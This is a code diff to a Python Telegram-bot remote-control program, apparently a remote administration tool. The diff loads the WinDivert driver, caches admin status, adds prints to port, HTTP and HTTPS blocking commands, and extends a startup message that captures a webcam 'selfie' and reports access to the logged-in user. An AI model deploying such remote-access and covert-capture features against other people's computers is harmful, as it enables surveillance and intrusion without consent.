@@ -38,6 +38,7 @@ import soundfile as sf
 import sounddevice as sd
 
 #MISC
+import os
 import sys
 import json
 import ctypes
@@ -63,21 +64,22 @@ from keyboard import press as press_key, release as release_key, read_event, KEY
 from os.path import join, abspath, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize
 
 
-#UTILS
-import pyngrok
-from utils import *
-try:
-    from plugins import *
-except ImportError as e:
-    print(f"Plugins not loaded\n{e}\n")
-    plugins = None
-
 def resource_path(relative_path: str) -> str:
     if getattr(sys, 'frozen', False):
         base_path = dirname(sys.executable)
     else:
         base_path = dirname(__file__)
     return join(base_path, relative_path)
+
+def load_dll(name: str) -> None:
+    if getattr(sys, "frozen", False):
+        base = sys._MEIPASS
+    else:
+        base = os.path.dirname(__file__)
+
+    path = os.path.join(base, name)
+    ctypes.WinDLL(path)
+
 
 # CONSTANTS
 logging = False
@@ -88,6 +90,17 @@ HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
 BURN_DIRECTORY = gettempdir()
 TELEGRAM_BOT_LIMIT = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
 GENERATE_COMMANDS_MD = False
+
+load_dll(r"assets\dlls\WinDivert64.dll")
+#UTILS
+import pyngrok
+from utils import *
+try:
+    from plugins import *
+except ImportError as e:
+    print(f"Plugins not loaded\n{e}\n")
+    plugins = None
+
 
 
 try:
@@ -297,7 +310,7 @@ def terminate_process_by_name(process_name: str) -> None:
 def requires_admin(func):
     @functools.wraps(func)
     def wrapper(self, *args, **kwargs):
-        if is_admin():
+        if self.has_admin:
             return func(self, *args, **kwargs)
         self.bsend("This function requires the program to be started as administrator")
     return wrapper
@@ -322,6 +335,7 @@ class PeppinoTelegram:
         self.can_use_ngrok = bool(ngrok_token)
         self.tunnelhandler = TunnelManager(tunnel_provider)
         self.tunnel_provider = tunnel_provider
+        self.has_admin = is_admin()
 
         # Need to add this one so someone who spams my bot won't spam me
         self.strangers : list[int] = []
@@ -588,16 +602,19 @@ class PeppinoTelegram:
     # TODO: loading bar not updating!!
     @requires_admin
     def block_port(self, port: int, timeout: int) -> None:
+        print("blocking port")
         loading_bar = self.new_loading_bar_timed_worker("Blocking Port", timeout, block_port, (port, timeout))
         loading_bar.start()
 
     @requires_admin
     def block_http(self, timeout: int) -> None:
+        print("blocking http")
         loading_bar = self.new_loading_bar_timed_worker("Blocking HTTP", timeout, block_http, (timeout,))
         loading_bar.start()
 
     @requires_admin
     def block_https(self, timeout: int) -> None:
+        print("blocking https")
         loading_bar = self.new_loading_bar_timed_worker("Blocking HTTPS", timeout, block_https, (timeout,))
         loading_bar.start()
 
@@ -2145,7 +2162,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
         self.screen_width, self.screen_height = pg.size()
         STARTING_LOG_MESSAGE.edit("GOT SCREEN SIZE")
-        botstartedmessage = f"Bot started now, you have acces to 👤{getlogin()}"
+        botstartedmessage = f"Bot started now, you have acces to 👤{getlogin()}\nAdmin: {'yes' if self.has_admin else 'no'}"
         if not sys.argv[1:]:
             if not self.selfie(botstartedmessage, reply_markup=self.replyquickmenu()):
                 self.bsend(botstartedmessage, reply_markup=self.replyquickmenu())
